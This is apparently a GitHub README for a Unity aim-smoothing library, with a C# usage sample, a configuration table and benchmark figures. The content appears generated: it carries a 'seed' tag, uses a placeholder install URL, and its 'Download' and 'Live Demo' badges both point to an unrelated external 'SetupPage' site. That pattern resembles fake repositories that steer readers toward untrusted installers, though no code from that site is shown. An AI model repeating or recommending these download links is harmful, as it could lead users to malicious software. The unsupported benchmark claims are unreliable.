# RobRun‑Aim‑Smoothing  

**Author:** FiscalPresent  
**Repository:** `RobRun-Aim-Smoothing` (seed #654584)  

---  

## 🎯 What Is This?

RobRun‑Aim‑Smoothing is a lightweight, **configurable** library that brings buttery‑smooth targeting and motion control to any Unity‑based project. Whether you’re building a first‑person shooter, a robot‑simulation, or a custom UI cursor, the library lets you define **presets** that automatically blend acceleration, deceleration, and jitter‑reduction into one seamless experience.

> *“Smooth aiming isn’t a luxury – it’s a necessity for responsive gameplay and precise robotics.”* – FiscalPresent  

---  

## ✨ Key Features  

| ✅ | Feature | Why It Matters |
|---|---------|----------------|
| 🎛️ | **Configurable Presets** | Switch between sniper‑level steadiness, rapid‑fire agility, or anything in‑between with a single JSON file. |
| 🧭 | **Trajectory‑Smoothing Engine** | Uses a hybrid of exponential smoothing and PID control for natural motion curves. |
| 🔧 | **Runtime Tweaking** | Adjust parameters on‑the‑fly via Unity’s inspector or a simple script API. |
| 📦 | **Modular Architecture** | Pull only the components you need – the core, the UI helper, or the robotics adapter. |
| 🌐 | **Cross‑Platform** | Works in Unity 2020‑LTS and newer, on Windows, macOS, Linux, Android, and iOS. |
| 📚 | **Full Documentation & Samples** | Ready‑to‑run demo scenes and exhaustive API docs. |

---  

## 📂 Repository Layout  

```
RobRun-Aim-Smoothing/
├─ Docs/               # Markdown docs, API reference, and design notes
├─ Samples/            # Unity projects demonstrating each preset
├─ Runtime/            # Core smoothing engine (C#)
│   ├─ Core/
│   ├─ Presets/
│   └─ Extensions/
├─ Editor/             # Custom inspector & preset creator
├─ Tests/              # NUnit test suite
└─ package.json        # Unity package manifest
```

---  

## 🚀 Getting Started  

### 1️⃣ Install via Unity Package Manager  

1. Open **Window → Package Manager**.  
2. Click the **+** → **Add package from git URL…**.  
3. Paste the repository URL:  

```
https://github.com/yourusername/RobRun-Aim-Smoothing.git
```  

### 2️⃣ Import a Preset  

```csharp
using RobRun.AimSmoothing;

public class PlayerAim : MonoBehaviour
{
    public AimPreset preset; // Drag a preset asset here

    private AimController _controller;

    void Awake()
    {
        _controller = new AimController(preset);
    }

    void Update()
    {
        Vector2 input = new Vector2(Input.GetAxis("Mouse X"), Input.GetAxis("Mouse Y"));
        _controller.UpdateAim(input);
    }
}
```

### 3️⃣ Create Your Own Preset  

1. Right‑click in the Project window → **Create → RobRun → Aim Preset**.  
2. Adjust **Acceleration**, **Damping**, **Jitter Filter**, and **Max Speed** sliders.  
3. Save the asset and assign it to any `AimController`.

---  

## 📦 Download / Live Demo  

<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download-Release%20Page-4CAF50?style=for-the-badge&logo=github" alt="Download"></a>  
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Live%20Demo-Play%20Now-2196F3?style=for-the-badge&logo=unity" alt="Live Demo"></a>  

---  

## 🛠️ Configuration Reference  

| Parameter | Type | Range | Description |
|-----------|------|-------|-------------|
| `acceleration` | `float` | 0 – 20 | How quickly the aim speed ramps up. |
| `deceleration` | `float` | 0 – 20 | How quickly the aim slows when input stops. |
| `damping` | `float` | 0 – 1 | Exponential smoothing factor (0 = no smoothing). |
| `jitterFilter` | `float` | 0 – 1 | Low‑pass filter strength for noisy inputs. |
| `maxSpeed` | `float` | 0 – 1000 | Upper bound for aim velocity (degrees/sec). |
| `snapThreshold` | `float` | 0 – 5 | Distance at which the aim snaps instantly (useful for UI cursors). |

> **Tip:** Use the **Preset Creator** window (Window → RobRun → Preset Creator) to experiment with values in real‑time.

---  

## 📈 Performance & Benchmarks  

| Platform | Avg. CPU (per aim instance) | Memory Overhead |
|----------|-----------------------------|-----------------|
| Windows (DX12) | 0.12 ms | ~12 KB |
| macOS (Metal) | 0.09 ms | ~11 KB |
| Android (ARM64) | 0.21 ms | ~14 KB |
| iOS (A14) | 0.18 ms | ~13 KB |

*Benchmarks run on a Unity 2022.3 LTS project with 1,000 concurrent `AimController` instances.*  

---  

## 🧪 Testing  

```bash
# Run the NUnit test suite
dotnet test ./Tests/RobRun.AimSmoothing.Tests.csproj
```

The test suite covers:

* Preset serialization / deserialization  
* Edge‑case handling for extreme acceleration / deceleration  
* Real‑time jitter filtering accuracy  

---  

## 🤝 Contributing  

1. Fork the repo.  
2. Create a feature branch (`git checkout -b feat/awesome‑preset`).  
3. Add your changes, include unit tests.  
4. Submit a Pull Request with a clear description and screenshots (if UI changes).  

> **Code of Conduct:** Please be respectful, inclusive, and keep discussions focused on the library’s functionality.

---  

## 📜 License  

This project is licensed under the **MIT License** – see the `LICENSE` file for details.

---  

## 📣 Stay Connected  

- **GitHub Issues:** Report bugs or request features.  
- **Discord:** Join the community chat at `discord.gg/RobRunDev`.  
- **Twitter:** Follow @FiscalPresent for updates and tips.  

Happy smoothing! 🚀